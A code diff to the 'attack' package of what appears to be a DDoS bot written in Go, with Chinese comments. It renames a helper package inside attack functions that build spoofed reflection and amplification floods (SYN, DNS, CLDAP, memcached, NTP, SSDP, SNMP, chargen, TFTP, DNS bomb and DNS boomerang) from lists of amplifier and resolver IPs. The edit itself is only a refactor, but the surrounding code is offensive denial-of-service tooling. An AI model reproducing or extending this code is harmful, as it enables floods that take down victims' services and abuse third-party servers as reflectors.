@@ -1,7 +1,6 @@
 package attack
 
 import (
-	"bot/packetbuilder"
 	"bot/packetbuilder/protocol"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -30,7 +29,7 @@ func (l *Layer4) udpPacket() ([][]byte, error) {
 
 	if l.SrcIP == "" {
 		// 不伪造IP直接发包
-		_,srcip,err := packetbuilder.FindInterface(l.DstIP)
+		_,srcip,err := protocol.FindInterface(l.DstIP)
 		if err != nil {
 			return nil, fmt.Errorf("生成 UDP 数据包失败: %v", err)
 		}
@@ -61,7 +60,7 @@ func (l *Layer4) synPacket() ([][]byte, error) {
 			packets = append(packets, synpacket)
 		}
 	} else {
-		ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+		ampList, err := protocol.LoadIPList(l.AmpFile)
 		if err != nil {
 			return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 		}
@@ -79,7 +78,7 @@ func (l *Layer4) synPacket() ([][]byte, error) {
 
 func (l *Layer4) dnsaPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 	}
@@ -99,7 +98,7 @@ func (l *Layer4) dnsaPacket() ([][]byte, error) {
 
 func (l *Layer4) dnsnsPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 	}
@@ -121,7 +120,7 @@ func (l *Layer4) dnsnsPacket() ([][]byte, error) {
 
 func (l *Layer4) rdpPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 	}
@@ -139,7 +138,7 @@ func (l *Layer4) rdpPacket() ([][]byte, error) {
 
 func (l *Layer4) cldapPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 	}
@@ -157,7 +156,7 @@ func (l *Layer4) cldapPacket() ([][]byte, error) {
 
 func (l *Layer4) memcachedPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 	}
@@ -175,7 +174,7 @@ func (l *Layer4) memcachedPacket() ([][]byte, error) {
 
 func (l *Layer4) ardPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 	}
@@ -193,7 +192,7 @@ func (l *Layer4) ardPacket() ([][]byte, error) {
 
 func (l *Layer4) ntpPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载服务器文件失败: %v", err)
 	}
@@ -212,7 +211,7 @@ func (l *Layer4) ntpPacket() ([][]byte, error) {
 // 在layer4.go中添加对应攻击方法（attack/layer4.go）
 func (l *Layer4) ssdpPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载SSDP服务器列表失败: %v", err)
 	}
@@ -229,7 +228,7 @@ func (l *Layer4) ssdpPacket() ([][]byte, error) {
 
 func (l *Layer4) chargenPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载Chargen服务器列表失败: %v", err)
 	}
@@ -246,7 +245,7 @@ func (l *Layer4) chargenPacket() ([][]byte, error) {
 
 func (l *Layer4) snmpPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载SNMP服务器列表失败: %v", err)
 	}
@@ -280,7 +279,7 @@ func (l *Layer4) openvpnPacket() ([][]byte, error) {
 
 func (l *Layer4) tftpPacket() ([][]byte, error) {
 	var packets [][]byte
-	ampList, err := packetbuilder.LoadIPList(l.AmpFile)
+	ampList, err := protocol.LoadIPList(l.AmpFile)
 	if err != nil {
 		return nil, fmt.Errorf("加载TFTP服务器列表失败: %v", err)
 	}
@@ -296,12 +295,12 @@ func (l *Layer4) tftpPacket() ([][]byte, error) {
 }
 
 func (l *Layer4) dnsBomb() ([][]byte, error) {
-	resolver, err := packetbuilder.LoadIPList("./serverfile/resolver.txt")
+	resolver, err := protocol.LoadIPList("./serverfile/resolver.txt")
 	if err != nil {
 		return	nil, nil
 	}
 
-	interfaceName, _, err := packetbuilder.FindInterface(resolver[0])
+	interfaceName, _, err := protocol.FindInterface(resolver[0])
 	if err != nil {
 		fmt.Printf("没有可用的网络接口: %v\n", err)
 		return	nil, nil
@@ -337,12 +336,12 @@ func (l *Layer4) dnsBomb() ([][]byte, error) {
 
 // 目标是DNS解析器，解析器IP存放在serverfile中
 func (l *Layer4) dnsBoomerang() ([][]byte, error) {
-	resolver, err := packetbuilder.LoadIPList("./serverfile/resolver.txt")
+	resolver, err := protocol.LoadIPList("./serverfile/resolver.txt")
 	if err != nil {
 		return	nil, nil
 	}
 
-	interfaceName, _, err := packetbuilder.FindInterface(resolver[0])
+	interfaceName, _, err := protocol.FindInterface(resolver[0])
 	if err != nil {
 		fmt.Printf("没有可用的网络接口: %v\n", err)
 		return	nil, nil
@@ -356,7 +355,7 @@ func (l *Layer4) dnsBoomerang() ([][]byte, error) {
 	defer handle.Close()
 
 	// 第二层反射器，reflector的IP为源IP
-	ampList, err := packetbuilder.LoadIPList("./serverfile/reflector.txt")
+	ampList, err := protocol.LoadIPList("./serverfile/reflector.txt")
 	if err != nil {
 		return	nil, nil
 	}
